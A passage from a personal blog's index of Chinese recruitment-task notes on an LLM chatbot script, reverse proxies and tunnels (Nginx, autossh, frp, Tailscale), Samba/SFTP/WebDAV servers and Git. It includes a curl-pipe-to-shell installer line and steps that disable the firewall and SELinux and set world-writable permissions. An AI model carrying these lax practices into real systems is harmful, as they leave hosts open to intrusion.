5. **协作与文化**：强调团队之间的沟通、协作和责任共担，打破“开发”与“运维”之间的壁垒。 常用工具包括：Git、Jenkins、Docker、Kubernetes、Ansible、Prometheus、ELK 等。 qwen-max 1 2 3 4 5 6 7 8 9 10 11 DevOps是一种文化和实践的集合，旨在通过促进开发（Development）、技术运营（Operations）以及其它相关团队之间的沟通、协作与整合，来提高软件开发和交付的速度及质量。它强调在整个软件生命周期中采用自动化工具和技术，以实现持续集成、持续交付/部署（CI/CD），从 而更快地响应市场变化，并提高组织的灵活性。 DevOps的核心理念包括但不限于： - **文化转型**：鼓励跨职能团队合作，打破传统IT部门间的壁垒。 - **自动化**：利用各种工具自动化构建、测试和部署过程，减少人为错误，加快迭代速度。 - **持续改进**：基于反馈循环不断优化流程，追求更高效的工作方式。 - **测量与监控**：重视性能指标的收集与分析，确保系统稳定性和服务质量。 总之，DevOps旨在通过加强不同角色之间的协作，结合敏捷方法论与自动化技术，帮助企业更快地将高质量的产品推向市场 deepseek-v3.2-exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 DevOps 是一种结合软件开发（Development）与 IT 运维（Operations）的文化理念与实践方法，旨在通过自动化与协作，缩短软件开发生命 周期，提升交付效率、系统稳定性与产品质量。 ### 核心目标： 1. **快速交付**：通过自动化流程（如 CI/CD）加速软件发布。 2. **高质量输出**：持续测试与监控，及早发现并修复问题。 3. **跨团队协作**：打破开发与运维之间的壁垒，促进沟通与责任共担。 ### 关键实践： - **持续集成/持续部署（CI/CD）**：自动化构建、测试和部署流程。 - **基础设施即代码（IaC）**：用代码管理服务器和配置，确保环境一致性。 - **自动化测试与监控**：实时跟踪系统性能，快速响应故障。 ### 常用工具链示例： - **代码管理**：Git、GitLab - **CI/CD**：Jenkins、GitHub Actions - **容器化**：Docker、Kubernetes - **监控**：Prometheus、Grafana 通过融合文化、流程与工具，DevOps 帮助团队更灵活地应对市场需求，实现高效可靠的软件交付。 构建一个命令行聊天机器人 功能实现：编写一个 Python 脚本，创建一个可以持续与用户交互的命令行聊天机器人。 交互循环：使用一个无限循环，不断接收用户的输入，并将其作为提示词（Prompt）发送给 LLM。 对话管理：将 LLM 的回复打印回命令行，然后再次等待用户的输入。 退出机制：当用户输入特定指令（例如 quit 或 exit）时，程序能够优雅地退出。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 改成了流式输出 import os from openai import OpenAI client = OpenAI( # 若没有配置环境变量，请用百炼API Key将下行替换为：api_key=\u0026#34;sk-xxx\u0026#34;, api_key=\u0026#34;......\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) prompt = input() while(prompt != \u0026#34;exit\u0026#34; and prompt != \u0026#34;quit\u0026#34;): completion = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, # 此处以qwen-plus为例，可按需更换模型名称。模型列表：https://help.aliyun.com/zh/model-studio/getting-started/models messages=[{\u0026#39;role\u0026#39;: \u0026#39;system\u0026#39;, \u0026#39;content\u0026#39;: \u0026#39;You are a helpful assistant.\u0026#39;}, {\u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, \u0026#39;content\u0026#39;: prompt}], stream=True, stream_options={\u0026#34;include_usage\u0026#34;: True} ) for chunk in completion: # 提取当前片段中的文本内容（delta.content） if chunk.choices: # 这里得判断一下 content = chunk.choices[0].delta.content if content: # 只打印非空内容（过滤空片段） print(content, end=\u0026#34;\u0026#34;, flush=True) # 实时输出，不换行 print() # 每个回复结束后换行 prompt = input() print(\u0026#34;拜拜~\u0026#34;) 提示词工程（Prompt Engineering） 角色扮演：修改你的聊天机器人脚本，让模型扮演一个特定角色，例如“一位严厉的Linux导师”或“一个幽默的段子手”。 指令遵循：尝试给模型一些复杂的指令，例如“用 Markdown 格式列出所有重要的 Linux 命令，并为每个命令提供一个简短的例子。” 限制输出：要求模型在回答问题时，遵循特定的格式或长度限制，例如“只用100字以内回答。” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import os from openai import OpenAI ...... system = input(\u0026#34;请输入你想让我扮演的角色：\u0026#34;) # 更新了这里 prompt = input(\u0026#34;你想对我说什么？\u0026#34;) while(prompt != \u0026#34;exit\u0026#34; and prompt != \u0026#34;quit\u0026#34;): completion = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, # 此处以qwen-plus为例，可按需更换模型名称。模型列表：https://help.aliyun.com/zh/model-studio/getting-started/models messages=[{\u0026#39;role\u0026#39;: \u0026#39;system\u0026#39;, \u0026#39;content\u0026#39;: system}, {\u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, \u0026#39;content\u0026#39;: prompt}], stream=True, stream_options={\u0026#34;include_usage\u0026#34;: True} ) ...... prompt = input(\u0026#34;再说点什么呢？\u0026#34;) print(\u0026#34;拜拜~\u0026#34;) ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-llm%E4%B8%93%E9%A2%98/","title":"御林招新题：LLM 专题"},{"content":"Nginx 反向代理 什么是反向代理？ 反向代理是一种服务器架构模式，客户端向反向代理服务器发起请求，反向代理服务器再将请求转发到内部网络中的实际服务器（内网服务），并将实际服务器的响应返回给客户端。从客户端角度看，仿佛是直接和反向代理服务器交互，无需知晓背后内网服务的存在。Nginx 作为高性能的 Web 服务器和反向代理服务器，很适合承担这个角色。 任务：在一台可以从公网访问的服务器（或本地虚拟机）上安装 Nginx，并将其配置为反向代理，以转发流量到你的内网服务（例如，在另一台机器上运行的 Web 服务器）。\n具体操作：\n在公网服务器上安装 Nginx。 修改 Nginx 配置文件，添加一个 server 块，并使用 proxy_pass 指令将请求转发到你的内网 IP 地址和端口。 1 2 3 4 5 6 7 8 9 10 11 12 13 # /etc/nginx/conf.d/reverse-proxy.conf # 需要先把 /etc/nginx/nginx.conf 里监听 80 端口的 server 注释掉 server { listen 80; # 监听80端口（HTTP默认端口） server_name 8.137.38.223; # 公网服务器的IP地址 location / { proxy_pass http://127.0.0.1:8001; # 转发到内网Web服务器的IP和端口 proxy_set_header Host $host; # 传递请求头中的Host信息，确保内网服务器能正确识别 proxy_set_header X-Real-IP $remote_addr; # 传递真实客户端IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 记录代理链的IP } } 验证：通过公网 IP 访问 Nginx 服务器，确认能成功显示内网服务的页面。 Autossh 端口转发 任务：使用 autossh 建立一个持久的 SSH 反向隧道，将内网服务的端口暴露到公网服务器上。 SSH 反向隧道：通常情况下，SSH 隧道是从客户端（能访问公网的机器）主动连接到服务端（公网服务器），实现从客户端到服务端的端口转发。而反向隧道则是让服务端（公网服务器）主动连接到客户端（内网机器），从而将内网机器的端口暴露到公网服务器上，使得公网可以访问内网服务。 Autossh：是 SSH 的一个封装工具，它能够自动监控 SSH 连接的状态，当连接断开时会自动重新建立连接，保证隧道的持久性，避免因为网络波动等原因导致隧道中断后需要手动重新建立。 具体操作： 在内网机器上安装 autossh。 执行 autossh 命令，将内网服务的端口（例如 8080）反向隧道到公网服务器的一个指定端口（例如 8000）。 配置 ssh 公钥： 内网：ssh-keygen 上传到服务器：ssh-copy-id -i /root/key.pub user@8.137.38.223 1 autossh -M 20000 -fCNR public_server_ip:8000:localhost:5000 root@public_server_ip 各参数解释： -M 20000：指定一个监视端口，autossh 通过这个端口来监视 SSH 连接的状态，确保连接的持久性。 -f：将 autossh 放入后台运行。 -C：启用压缩，减少数据传输的大小，提高传输效率。 -N：不执行远程命令，只进行端口转发。 -R public_server_ip:8000:localhost:8080：建立反向隧道，将公网服务器的8000端口转发到内网机器的localhost:8080（即内网服务的端口）。user是公网服务器上的用户名。 验证：通过访问公网服务器的 8000 端口，确认能访问到内网服务。 docker ps -a 看所有容器；docker rm 删除\ndocker insepct \u0026lt;image\u0026gt; 看一下端口\n配了很久，要注意的点： autossh 指令：public_server_ip:8000 这里要写 0.0.0.0，不然只能服务器本地访问 不知道为什么密钥上传了但是没用 需要将服务器上的 /etc/ssh/sshd_config 中 GatewayPorts 改为 yes，否则隧道仅允许目标服务器本地访问 8000 端口 netstat -tuln | grep 8000 看服务器 ssh 连接状态； ps（process status） aux | grep autossh 看内网的 autossh 命令 云服务器还要看一下安全组是不是拦截了 Tailscale 零配置网络 任务：使用 Tailscale 建立一个零配置的虚拟私有网络（VPN），实现内网设备的点对点互联。 不需要复杂的网络配置（如端口转发、防火墙规则调整等），就能让分布在不同网络环境（如内网、公网）的设备，像在同一个局域网内一样实现点对点的互联互通。Tailscale 用于简化 VPN 搭建流程\n具体操作：\n在你的公网服务器和内网机器上分别安装 Tailscale。 curl -fsSL https://tailscale.com/install.sh | sh\n注册 https://login.tailscale.com/\n使用你的账户登录并加入 Tailscale 网络。 1 2 3 4 5 6 7 8 [root@localhost ~]# tailscale ip 100.124.165.66 [root@iZ2vc96n4f90pw7f8dfbfsZ ~]# tailscale ip 100.75.140.47 # 访问 OK [root@iZ2vc96n4f90pw7f8dfbfsZ ~]# curl http://100.124.165.66:5000 Hello from Flask! 验证：在公网服务器上，通过内网机器的 Tailscale IP 或主机名直接访问其内网服务，无需任何端口转发。 Frp (Fast Reverse Proxy) 任务：使用 Frp 客户端-服务端模式，将内网服务暴露到公网。 Frp（Fast Reverse Proxy）是一款专注于内网穿透的高性能反向代理应用\n下载 wget https://github.com/fatedier/frp/releases/download/v0.32.1/frp_0.32.1_linux_amd64.tar.gz\n安装参考：CentOS 7 部署frp穿透内网_centos frp-CSDN博客\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 关防火墙 systemctl stop firewalld \u0026amp;\u0026amp; systemctl disable firewalld # 关 SELinux setenforce 0 # 创建安装路径 mkdir -p /usr/local/frps # 解压备用 tar zxvf frp_0.32.1_linux_amd64.tar.gz -C /tmp # 复制 frps 和 frps.ini 两个配置文件 # 注意！！！ 客户端要复制的是 frpc 和 frpc.ini cd /tmp/frp_0.32.1_linux_amd64 cp frps frps.ini /usr/local/frps # 配置 vim /usr/local/frps/frps.ini 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 内网 frpc.ini [common] server_addr = 8.137.38.223 # 公网服务器 IP server_port = 7000 # 服务端 bind_port [web_tcp] # 模块名可自定义 type = tcp # 改为 TCP 类型 local_ip = 127.0.0.1 local_port = 5000 remote_port = 8001 # 公网服务器上用于访问的端口（需和服务端端口不冲突??冲突！） # 服务器 frps.ini [common] bind_port = 7000 # Frp 服务端与客户端通信的端口 vhost_http_port = 8080 # 若要通过 HTTP 访问内网 Web 服务，设置此端口 具体操作：\n在一台公网服务器上运行 frps（服务端）。\n在内网机器上运行 frpc（客户端），并配置其连接到服务端，将内网服务的端口暴露出去。\n启动 ./frps -c ./frps.ini\n验证：通过公网服务器的 IP 和 Frp 配置的端口，确认能访问到内网服务。 错了几个点：\n运行内网的时候运行成 frps 了 ……\n如果配置为 http 的话，还需要域名，所以改成了 tcp\n","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E7%BD%91%E7%BB%9C%E8%BD%AC%E5%8F%91/","title":"御林招新题：内网穿透与流量转发专题"},{"content":"文件共享协议理解 任务：简要解释 SMB/CIFS 和 SFTP 这两种文件共享协议的作用和主要区别。 SMB（Server Message Block）/CIFS（Common Internet File System） 是一种网络文件共享协议，主要用于在局域网内实现文件和打印机等资源的共享。它允许不同计算机之间通过网络访问彼此的文件、目录，就像访问本地文件一样方便 典型应用场景：在 Windows 网络环境中，如，在企业内部的 Windows 办公网络里，员工的电脑可以通过 SMB 协议访问文件服务器上的共享文件夹，实现文档的集中存储和多人协作编辑；学校的计算机教室中，教师机能通过该协议向学生机共享教学资料等 CIFS 脱胎于 SMB，CIFS 兼容性较好，是不同操作系统和网络环境提供一种通用的文件共享解决方案 SFTP（SSH File Transfer Protocol） 基于 SSH（Secure Shell）的文件传输协议，它利用 SSH 的安全特性，在文件传输过程中提供加密保护，确保数据在网络传输时的安全性，防止被窃听或篡改。 典型应用场景：常用于 Linux 系统以及跨平台环境下的安全文件传输。比如，在 Linux 服务器之间进行文件备份和同步时、在开发者需要从本地向远程 Linux 服务器上传代码或下载日志文件时，使用 SFTP 可以保证传输的文件不被非法获取 区别 SMB/CIFS：Windows 网络原生，使用方便；局域网环境下，传输文件高效；但是安全性有所不足 SFTP：兼容性较好；由于加密消耗，性能会有所下降；功能相对来说比较单一，专注于文件上传、下载；基于 ssh 协议，数据传输稳定、可靠 具体操作： 描述 SMB/CIFS 的典型应用场景（例如在 Windows 网络中）。 描述 SFTP 的典型应用场景（例如在 Linux 和跨平台环境中）。 Samba 服务配置（SMB/CIFS） 任务：安装并配置 Samba，实现局域网内文件的共享访问。\n具体操作：\n在你的 Linux 服务器上安装 Samba。 sudo yum install samba samba-client samba-common\n创建一个专用于 Samba 的用户，并设置密码。 1 2 3 [root@localhost frps]# sudo useradd sambauser [root@localhost frps]# sudo smbpasswd -a sambauser ...... 修改 /etc/samba/smb.conf 配置文件，创建一个共享目录，并确保只有你创建的用户可以访问。 1 2 3 4 5 6 sudo mkdir -p /home/samba/share sudo chown sambauser:sambauser /home/samba/share sudo chmod 755 /home/samba/share sudo vim /etc/samba/smb.conf # 重启生效 sudo systemctl restart smb nmb 1 2 3 4 5 6 7 8 [myshare] # smb.conf comment = My Samba Share path = /home/samba/share valid users = sambauser writable = yes browseable = yes create mask = 0755 directory mask = 0755 验证：在另一台局域网内的电脑（例如 Windows 或 macOS）上，通过网络邻居或文件管理器访问你的共享目录，并上传一个文件进行测试。 Windows 需要在控制面版里启用 SMB、重启\n注意：直接在地址栏输入\\\\192.168.109.100 即可！！\n上传了一个文件到 sambauser，OK\nSFTP 服务配置 任务：利用 SSH 服务配置 SFTP，实现安全的文件传输和管理。\n具体操作：\n确保你的服务器上已安装 SSH 服务。 sudo yum install openssh-server\n创建一个专用于 SFTP 的新用户，并设置密码。 修改 /etc/ssh/sshd_config 文件，配置 SFTP 子系统，并限制 SFTP 用户只能访问其主目录，无法登录 Shell。 1 2 3 4 5 6 7 8 sudo systemctl start sshd sudo useradd sftpuser sudo usermod -s /sbin/nologin sftpuser # 限制登录系统 shell！ cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak # 备份一下配置文件 vi /etc/ssh/sshd_config sudo systemctl restart sshd # 重启生效 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 注释掉原来的 SFTP 子系统配置 # Subsystem sftp /usr/lib/openssh/sftp-server # 配置新的 SFTP 子系统，使用 internal-sftp # 相比原来的 sftp-server，更便于配置和限制。 Subsystem sftp internal-sftp # 匹配 SFTP 用户（这里是 sftpuser） # 对用户 sftpuser 应用后续的配置 Match User sftpuser # 强制使用 internal-sftp,无法执行 shell ForceCommand internal-sftp # 限制用户只能访问其主目录 ChrootDirectory %h # 允许用户进行的操作，这里设置为允许读写等 # 禁止 TCP 转发和 X11 转发，增强安全性 AllowTcpForwarding no X11Forwarding no # 这下面还有配置，要剪切到前面，不能放在 Match 下面！ 验证：使用一个 SFTP 客户端（例如 FileZilla 或 WinSCP）连接到你的服务器，使用 SFTP 用户登录，尝试上传文件，并确认无法执行 Shell 命令。 碰到的一些问题 需要将 ChrootDirectory（即目录，/home/sftpuser，两级都一样） 的权限设置为 755，并且归属于 root sudo chown root:root /home/sftpuser sshd -t 检查 config 的语法、看日志，又发现 usedns 不能在 matchuser 块内，移动一下 就可以了 权限精细化管理 任务：在 Samba 共享中，配置更细致的权限。\n具体操作：\n创建一个 Samba 组。 1 2 3 4 5 6 sudo groupadd sambagrp # 添加系统组 sudo smbgroupadd sambagrp # 添加 samba 组 sudo mkdir -p /home/samba/groupshare # 共享目录 sudo chgrp sambagrp /home/samba/groupshare # 归组 sudo chmod 770 /home/samba/groupshare # 设置权限 sudo vim /etc/samba/smb.conf 1 2 3 4 5 6 7 8 9 [groupshare] comment = Group Share Directory path = /home/samba/groupshare valid users = @sambagrp write list = @sambagrp browseable = yes read only = no create mask = 0660 directory mask = 0770 1 2 3 4 5 sudo systemctl restart smb nmb # 重启一下 # 加一个用户 sudo useradd groupuser1 sudo usermod -a -G sambagrp groupuser1 # a 是添加，G是修改用户所属的扩展群 sudo smbpasswd -a groupuser1 配置一个共享目录，允许该组内的所有用户读写，但禁止其他用户访问。 验证：用一个新用户尝试访问，确认其被拒绝；用组内用户访问，确认可以正常读写。 1 2 net use # 看连了什么 net use \\\\192.168.109.100 /delete # 先把原来的断开 WebDAV 配置 任务：搭建一个支持 WebDAV 协议的文件服务器，通过 HTTP/HTTPS 协议访问文件。\n具体操作：\n选择一个支持 WebDAV 的工具（例如 Nginx 或 Caddy），进行安装。 1 2 3 4 5 6 7 8 #wget https://github.com/caddyserver/caddy/releases/download/v2.7.6/caddy_2.7.6_linux_amd64.tar.gz #tar -xzf caddy_2.7.6_linux_amd64.tar.gz #sudo mv caddy /usr/bin/ # 失败了，还是用 docker 吧 sudo mkdir -p /var/www/webdav sudo chown -R $USER:$USER /var/www/webdav # 设置目录所有者，方便后续操作 vi ~/caddy-webdav/Caddyfile # 也失败了，插件不会配，专用 Nginx 参考 如何在 CentOS 7 服务器上通过 Nginx 部署 WebDAV\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 下载nginx wget1 https://github.com/nginx/nginx/archive/refs/tags/release-1.26.3.tar.gz # 解压nginx tar xvf release-1.26.3.tar.gz # 切换到nginx目录，下载nginx-dav-ext-module cd nginx-release-1.26.3/ wget1 https://github.com/arut/nginx-dav-ext-module/archive/refs/tags/v3.0.0.tar.gz # 解压nginx-dav-ext-module tar -xvf v3.0.0.tar.gz # 编辑安装 nginx，并且要指定插件！注意路径 auto/configure --prefix=/etc/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --sbin-path=/usr/sbin/nginx \\ --pid-path=/var/run/nginx.pid \\ --lock-path=/var/run/nginx.lock \\ --error-log-path=/var/log/nginx/error.log \\ --http-log-path=/var/log/nginx/access.log \\ --with-stream --with-http\\_dav\\_module --with-http\\_ssl\\_module --with-http\\_v2\\_module \\ --add-module=./nginx-dav-ext-module-3.0.0 # 编译剩余步骤 make \u0026amp;\u0026amp; make install nginx -V # 验证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # vim /lib/systemd/system/nginx.service [Unit] Description=A high performance web server and a reverse proxy server Documentation=man:nginx(8) After=network.target nss-lookup.target [Service] Type=forking PIDFile=/run/nginx.pid # master... 要删掉！ ExecStartPre=/usr/sbin/nginx -t -q -g \u0026#39;daemon on; #master\\_process# on;\u0026#39; ExecStart=/usr/sbin/nginx -g \u0026#39;daemon on; #master\\_process on#;\u0026#39; ExecReload=/usr/sbin/nginx -g \u0026#39;daemon on; #master\\_process on#;\u0026#39; -s reload ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid TimeoutStopSec=5 KillMode=mixed [Install] WantedBy=multi-user.target 1 2 3 4 5 # 重加载systemd配置 systemctl daemon-reload systemctl enable nginx.service systemctl start nginx.service systemctl status nginx.service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # vim /etc/nginx/nginx.conf server { listen 8089; listen [::]:8089; server\\_name localhost; # 认证方式 auth\\_basic realm\\_name; # 存放认证用户名、密码文件 auth\\_basic\\_user\\_file /etc/nginx/.webdav/auth.list; # webdav服务访问的根目录 root /cherry\\_data; dav\\_methods PUT DELETE MKCOL COPY MOVE; dav\\_ext\\_methods PROPFIND OPTIONS LOCK UNLOCK; dav\\_access user:rw group:rw all:r; client\\_body\\_temp\\_path /tmp/webdav; client\\_max\\_body\\_size 0; create\\_full\\_put\\_path on; #添加索引指令，如果忘记这项配置，nginx访问会提示403 location /{ root /cherry\\_data; autoindex on; autoindex\\_format html; autoindex\\_exact\\_size off; autoindex\\_localtime on; charset utf-8,gbk; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 # 最后 nginx -s reload cd /etc/nginx/ mkdir .webdav cd .webdav/ # 设置用户名为admin echo -n \u0026#39;admin:\u0026#39; | tee -a auth.list openssl passwd -apr1 | tee -a auth.list Password: #首次输入 Verifying - Password: #再次输入 mkdir /cherry\\_data chmod 777 /cherry\\_data # 访问的目录 配置一个 WebDAV 共享目录，并设置基础认证。 验证：使用支持 WebDAV 的客户端（例如 Windows 的网络位置）或浏览器访问，输入用户名和密码，确认可以管理文件。 用 windows 映射挂载的时候，发现不能用 http 协议，得改一下注册表 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters BasicAuthLevel 1改2 Win + R，services.msc；Webclent 重启 性能与安全性 任务：对你的文件服务器进行简单的性能测试和安全加固。\n具体操作：\n性能：使用 dd 命令或其他工具，测试在 Samba 和 SFTP 上传大文件的速度，并进行简单对比。 Samba:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PS C:\\Users\\calendar\\Downloads\u0026gt; fsutil file createnew ./test 1073741824 已创建文件 C:\\Users\\calendar\\Downloads\\test PS C:\\Users\\calendar\\Downloads\u0026gt; Measure-Command { Copy-Item -Path \u0026#34;C:\\Users\\calendar\\Downloads\\test\u0026#34; -Destination \u0026#34;\\\\192.168.109.100\\groupshare\u0026#34; } Days : 0 Hours : 0 Minutes : 0 Seconds : 9 Milliseconds : 823 Ticks : 98231516 ...... TotalSeconds : 9.8231516 TotalMilliseconds : 9823.1516 stfp:\n安全：\n为 SFTP 服务配置基于密钥的认证，禁用密码登录。 密钥工具生成密钥，sftpuser / .ssh 目录，创建 authorized_keys 文件，将复制的公钥内容粘贴进去并保存。\n禁用密码：PasswordAuthentication 设置为 no\n简要说明这种认证方式比密码认证更安全的原因。 密码认证存在被暴力破解、泄露等风险；而基于密钥的认证使用非对称加密，私钥仅存于客户端且难以破解，公钥即使暴露也无法用于登录，极大提升了安全性，能有效防范密码相关的攻击手段。\n","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","title":"御林招新题：文件服务器"},{"content":"安装与配置 Git 在你的 Linux 操作系统上，安装 Git。 全局配置：配置你的全局用户名和邮箱，这是 Git 记录提交者信息所必需的。 验证：执行 git --version 命令，确认 Git 已正确安装。 1 2 3 4 [root@localhost hello]# git config --global user.name \u0026#34;calendar\u0026#34; [root@localhost hello]# git config --global user.email \u0026#34;1131821081@qq.com\u0026#34; [root@localhost hello]# git --version git version 1.8.3.1 创建与克隆仓库 本地仓库：在你的主目录下创建一个新的文件夹，并在其中初始化一个 Git 仓库。 远程克隆：找一个公开的 Git 仓库（例如 GitHub 上的一个开源项目），使用 git clone 命令将其克隆到本地。 这里还配置了一下 clash，记一下命令：\n1 2 3 4 5 6 7 8 9 10 11 $ clashctl + ... Usage: clash 命令一览 clashon 开启代理 clashoff 关闭代理 clashui 面板地址 clashstatus 内核状况 clashtun [on|off] Tun 模式 clashmixin [-e|-r] Mixin 配置 clashsecret [secret] Web 密钥 clashupdate [auto|log] 更新订阅 1 2 3 4 5 6 7 [root@localhost git_repo]# git clone https://github.com/calendar0917/learning_log.git Cloning into \u0026#39;learning_log\u0026#39;... remote: Enumerating objects: 72, done. ...... Unpacking objects: 100% (72/72), done. [root@localhost git_repo]# ls clash-for-linux-install learning_log 文件的提交与同步 文件修改：在你克隆的本地仓库中，对某个文件进行修改。\n暂存与提交：\n使用 git add 命令将修改后的文件添加到暂存区。 使用 git commit 命令提交你的变更，并附上一条有意义的提交信息。 登录的时候遇到问题，发现得要用 Personal Access Token 来代替 Password，然后保存一下登录：\n1 2 3 4 # 配置凭据缓存（默认缓存15分钟） git config --global credential.helper cache # 可选：设置缓存时间（单位：秒，例如设置30天） git config --global credential.helper \u0026#39;cache --timeout=2592000\u0026#39; 同步操作：\n使用 git pull 命令从远程仓库拉取最新的变更。 使用 git push 命令将你的本地提交推送到远程仓库。 1 2 3 4 5 6 7 [root@localhost learning_log]# git push ...... Username for \u0026#39;https://github.com\u0026#39;: calendar0917 Password for \u0026#39;https://calendar0917@github.com\u0026#39;: ...... remote: To https://github.com/calendar0917/learning_log.git 1d476d9..5a31feb main -\u0026gt; main 验证：在远程仓库页面上，确认你的提交历史已成功显示。\n分支管理 目标：理解分支的作用，掌握创建、切换和合并分支的操作。 在一个分支上进行的代码修改不会影响其他分支，进行实验性的开发，能回退到原来的状态。\n挑战：\n创建一个名为 feature-a 的新分支。 git branch name 新建分支\ngit checkout name 跳转分支\ngit checkout -b name 创建并跳转分支\n在新分支上对文件进行修改并提交。 1 2 3 4 5 6 7 8 [root@localhost learning_log]# git branch feature-a [root@localhost learning_log]# git checkout feature-a Switched to branch \u0026#39;feature-a\u0026#39; [root@localhost learning_log]# vi hello.txt [root@localhost learning_log]# git add hello.txt [root@localhost learning_log]# git commit -m \u0026#34;来自feature-a的修改\u0026#34; [feature-a 44b4133] 来自feature-a的修改 1 file changed, 1 insertion(+) 切换回主分支（main 或 master）。 使用 git merge 命令将 feature-a 分支的修改合并到主分支上。 删除 feature-a 分支。 1 2 3 4 5 6 7 8 9 10 11 12 [root@localhost learning_log]# git branch * feature-a main [root@localhost learning_log]# git checkout main Switched to branch \u0026#39;main\u0026#39; [root@localhost learning_log]# git merge feature-a Updating 5a31feb..44b4133 Fast-forward hello.txt | 1 + 1 file changed, 1 insertion(+) [root@localhost learning_log]# git branch -d feature-a Deleted branch feature-a (was 44b4133). 历史记录与回溯 目标：学会查看提交历史，并在需要时回溯到特定版本。\n挑战：\n使用 git log 命令查看你的提交历史。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@localhost learning_log]# git log commit 44b413353e383dcbc0063558f1ce87e544c7730b Author: calendar \u0026lt;1131821081@qq.com\u0026gt; Date: Sat Oct 18 05:54:50 2025 -0700 来自feature-a的修改 commit 5a31feb5ae61d40b7d6d7eaff991b5c3eeb82892 Author: calendar \u0026lt;1131821081@qq.com\u0026gt; Date: Sat Oct 18 05:38:50 2025 -0700 测试暂存与提交 commit 1d476d982a3144004612cc9162b83b6483e42faa Author: calendar0917 \u0026lt;1131821081@qq.com\u0026gt; Date: Thu Feb 13 11:10:55 2025 +0800 Initial commit 找到一个较早的提交 ID。 使用 git reset 或 git revert 命令将代码库回溯到该提交版本，并解释你所用命令的区别。 知识：\n工作区和暂存区： 工作区：可见的实际存放项目文件的目录 暂存区：一个临时保存文件修改的区域，它是位于 .git 目录中的一个文件（在.git/index） ，并不是一个实际可视化的文件夹。Git 利用暂存区来管理文件的状态，决定哪些文件的修改会被包含在下一次提交中。 使用 git add 命令后，工作区中已修改的文件会被添加到暂存区，文件进入已暂存状态。暂存区只记录那些即将被提交到版本库的文件修改信息 。 git revert: 原理是创建一个新的提交，用来抵消目标提交所做的修改。（对后面的修改不影响，且不修改历史记录） git reset： 用于将当前分支的 HEAD 指针重置到指定的提交版本，同时可以选择如何处理工作区和暂存区的文件 --hard 模式：将 HEAD 指针、暂存区和工作区都重置到指定提交版本 --soft 模式：仅将 HEAD 指针重置到指定提交版本，暂存区和工作区的内容保持不变 假设你有一串零散的提交（比如修复同一个功能的多次小修改），想把它们合并成一个清晰的大提交，--soft 模式非常合适 刚执行了 git commit，但发现提交信息写错了，或者想补充修改后再提交 --mixed 模式：将 HEAD 指针和暂存区重置到指定提交版本，工作区内容不变。 实操： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # 报错了，用 git status 看原因 [root@localhost learning_log]# git revert 5a31feb5ae61d40b7d6d7eaff991b5c3eeb82892 error: could not revert 5a31feb... 测试暂存与提交 hint: after resolving the conflicts, mark the corrected paths hint: with \u0026#39;git add \u0026lt;paths\u0026gt;\u0026#39; or \u0026#39;git rm \u0026lt;paths\u0026gt;\u0026#39; hint: and commit the result with \u0026#39;git commit\u0026#39; [root@localhost learning_log]# git status # On branch main --\u0026gt; 所在分支、状态 # Your branch is ahead of \u0026#39;origin/main\u0026#39; by 1 commit. # (use \u0026#34;git push\u0026#34; to publish your local commits) # # You are currently reverting commit 5a31feb. --\u0026gt; 正在进行的操作 # (fix conflicts and run \u0026#34;git revert --continue\u0026#34;) # (use \u0026#34;git revert --abort\u0026#34; to cancel the revert operation) # # Unmerged paths: --\u0026gt; 报错的地方，5a31feb 中创建了 hello.txt,这里需要手动删除才可以 # (use \u0026#34;git reset HEAD \u0026lt;file\u0026gt;...\u0026#34; to unstage) # (use \u0026#34;git add/rm \u0026lt;file\u0026gt;...\u0026#34; as appropriate to mark resolution) # # deleted by them: hello.txt # 手动删除 [root@localhost learning_log]# git rm hello.txt hello.txt: needs merge [root@localhost learning_log]# git revert --continue [main 49e231f] Revert \u0026#34;测试暂存与提交\u0026#34; 1 file changed, 2 deletions(-) delete mode 100644 hello.txt [root@localhost learning_log]# git push ...... 远程仓库进阶 目标：管理多个远程仓库，并实现不同仓库间的同步。 挑战： 为你的本地仓库添加第二个远程仓库（例如，一个 GitHub 仓库和一个 Gitee 仓库）。 将你的本地分支推送到这两个不同的远程仓库。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 查看并添加远程仓库 [root@localhost learning_log]# git remote -v origin https://github.com/calendar0917/learning_log.git (fetch) origin https://github.com/calendar0917/learning_log.git (push) [root@localhost learning_log]# git remote add gitee https://gitee.com/calendar917/learning_log.git [root@localhost learning_log]# git remote -v gitee https://gitee.com/calendar917/learning_log.git (fetch) gitee https://gitee.com/calendar917/learning_log.git (push) origin 